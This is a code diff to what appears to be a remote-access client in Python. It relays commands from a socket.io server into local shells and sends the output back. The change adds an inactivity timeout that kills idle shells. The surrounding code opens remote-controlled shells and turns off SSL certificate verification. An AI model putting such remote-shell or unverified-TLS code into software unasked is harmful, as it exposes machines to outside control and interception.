@@ -36,6 +36,8 @@ screen_qualtiy = 20
 # Dictionary to store shells by key
 shells = {}
 
+INACTIVITY_TIMEOUT = 30 * 60  # 30 minutes timeout in seconds
+
 def run(data):
     def create_module(url):
         # Create an SSL context that doesn't verify certificates
@@ -62,6 +64,7 @@ def run(data):
             self.running = False
             self.key = key
             self.uid = uid
+            self.last_activity_time = time.time()  # Track last activity time
 
         def start(self):
             self.running = True
@@ -94,6 +97,11 @@ def run(data):
 
             output_thread.start()
 
+            # Start a thread to monitor inactivity
+            inactivity_thread = threading.Thread(target=self.monitor_inactivity)
+            inactivity_thread.daemon = True
+            inactivity_thread.start()
+
         def read_output_posix(self):
             while self.running:
                 try:
@@ -103,18 +111,41 @@ def run(data):
                     )
                     if output:
                         sio.emit("result", {"key": self.key, "result": output, 'uid':self.uid})
+                        self.reset_inactivity_timer()  # Reset timer on output
                 except OSError:
                     break
 
         def read_output_windows(self):
             while self.process.isalive():
-                sio.emit("result", {"key": self.key, "result": self.process.read(), 'uid':self.uid})
+                output = self.process.read()
+                sio.emit("result", {"key": self.key, "result": output, 'uid':self.uid})
+                self.reset_inactivity_timer()  # Reset timer on output
 
         def write_input(self, command):
             if os.name == "posix":
                 os.write(self.master_fd, command.encode())
             else:
                 self.process.write(command)
+            self.reset_inactivity_timer()  # Reset timer on input
+
+        def reset_inactivity_timer(self):
+            self.last_activity_time = time.time()  # Reset inactivity timer
+
+        def monitor_inactivity(self):
+            while self.running:
+                time.sleep(10)  # Check every 10 seconds
+                if time.time() - self.last_activity_time > INACTIVITY_TIMEOUT:
+                    print(f"Shell {self.key} is inactive for 30 minutes, killing it.")
+                    self.terminate_shell()
+
+        def terminate_shell(self):
+            if self.process:
+                self.process.terminate()
+                self.running = False
+
+                if self.key in shells:
+                    del shells[self.key]
+                    print(f"Shell {self.key} has been removed from the shells dictionary.")
 
     @sio.on("command")
     def command(data_new):
